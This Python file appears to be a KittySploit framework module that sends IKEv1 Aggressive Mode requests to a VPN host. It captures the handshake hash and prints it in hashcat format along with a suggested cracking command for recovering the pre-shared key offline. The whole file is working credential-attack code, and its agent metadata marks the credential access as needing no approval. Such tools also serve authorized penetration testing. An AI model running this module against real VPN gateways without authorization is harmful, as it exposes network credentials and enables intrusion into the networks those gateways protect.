#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ipsec.ike import DEFAULT_DH_GROUP, ID_USER_FQDN, Ike


class Module(Auxiliary, Ike):

    __info__ = {
        "name": "IKEv1 Aggressive Mode PSK capture",
        "description": (
            "Captures IKEv1 Aggressive Mode handshake material for offline pre-shared key "
            "cracking. Outputs a hashcat-compatible line "
            "(g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r) suitable for modes "
            "5300 (MD5), 5400 (SHA1), or 5410 (SHA256). Equivalent to "
            "ike-scan --aggressive --pskcrack."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://github.com/royhills/ike-scan",
            "https://hashcat.net/wiki/doku.php?id=example_hashes",
            "RFC 2409",
        ],
        "modules": [
            "auxiliary/admin/ipsec/vpn_xauth_connect",
        ],
        "tags": [
            "ipsec",
            "ike",
            "vpn",
            "udp",
            "psk",
            "credentials",
            "gather",
            "ike-scan",
            "auxiliary",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "credential_access"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["credentials", "risk_signals", "evidence"],
        },
    }

    group_id = OptString(
        "kittysploit",
        "IKE group name / ID payload sent in Aggressive Mode (try discovered group IDs)",
        required=True,
    )
    id_type = OptString(
        "ID_USER_FQDN",
        "ID payload type: ID_USER_FQDN, ID_FQDN, ID_IPV4_ADDR",
        required=False,
        advanced=True,
    )
    dh_group = OptInteger(
        DEFAULT_DH_GROUP,
        "Diffie-Hellman group for Aggressive Mode (1, 2, 5, 14, ...)",
        required=False,
        advanced=True,
    )
    output_file = OptString(
        "",
        "Optional path to save the hashcat hash line",
        required=False,
    )

    _ID_TYPES = {
        "ID_USER_FQDN": ID_USER_FQDN,
        "ID_FQDN": 2,
        "ID_IPV4_ADDR": 1,
    }

    def check(self):
        host = self._ike_host()
        if not host:
            return {"vulnerable": False, "reason": "No target specified", "confidence": "low"}

        result = self.ike_capture_psk(
            id_value=str(self.group_id or "kittysploit"),
            id_type=self._id_type_value(),
            dh_group=int(self.dh_group or DEFAULT_DH_GROUP),
        )
        status = result.get("status")
        if status == "captured":
            mode = result.get("hashcat_mode") or 0
            return {
                "vulnerable": True,
                "reason": result.get("reason"),
                "confidence": "high",
                "details": f"hashcat_mode={mode}; id={self.group_id}",
            }
        if status == "no_hash":
            return {
                "vulnerable": True,
                "reason": "IKE Aggressive Mode works but no HASH returned (wrong group ID?)",
                "confidence": "medium",
                "details": result.get("summary"),
            }
        return {
            "vulnerable": False,
            "reason": result.get("reason") or "PSK capture failed",
            "confidence": "low",
        }

    def run(self):
        host = self._ike_host()
        port = self._ike_port()
        id_value = str(self.group_id or "kittysploit")
        dh_group = int(self.dh_group or DEFAULT_DH_GROUP)

        print_info(f"IKE Aggressive Mode PSK capture on {host}:{port}")
        print_info(f"Group ID / identity: {id_value!r} (DH group {dh_group})")

        result = self.ike_capture_psk(
            id_value=id_value,
            id_type=self._id_type_value(),
            dh_group=dh_group,
        )
        status = result.get("status")

        if status == "closed":
            print_error(result.get("reason") or "No IKE response")
            return False

        if status in ("error", "incomplete"):
            print_error(result.get("reason") or "Capture failed")
            summary = result.get("summary")
            if summary:
                print_status(summary)
            return False

        if status == "no_hash":
            print_warning(result.get("reason") or "No HASH in response")
            summary = result.get("summary")
            if summary:
                print_status(summary)
            print_warning(
                "The server may require a valid VPN group ID, or may return decoy hashes "
                "for unknown IDs"
            )
            return False

        capture = result.get("capture")
        hash_line = result.get("hashcat_line") or ""
        mode = int(result.get("hashcat_mode") or 0)

        print_success(result.get("reason") or "PSK material captured")
        if capture and capture.summary:
            print_info(capture.summary)

        print_status("Hashcat line (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):")
        print_info(hash_line)

        if mode:
            print_status(
                f"Suggested crack: hashcat -m {mode} -a 0 hash.txt wordlist.txt"
            )
        else:
            print_warning(
                "Unknown HASH length — try hashcat --identify or psk-crack on the line above"
            )

        out_path = str(self.output_file or "").strip()
        if out_path:
            try:
                with open(out_path, "w", encoding="utf-8") as handle:
                    handle.write(hash_line + "\n")
                print_success(f"Saved hash line to {out_path}")
            except OSError as exc:
                print_error(f"Could not write output_file: {exc}")
                return False

        return True

    def _id_type_value(self) -> int:
        key = str(self.id_type or "ID_USER_FQDN").strip().upper()
        return self._ID_TYPES.get(key, ID_USER_FQDN)
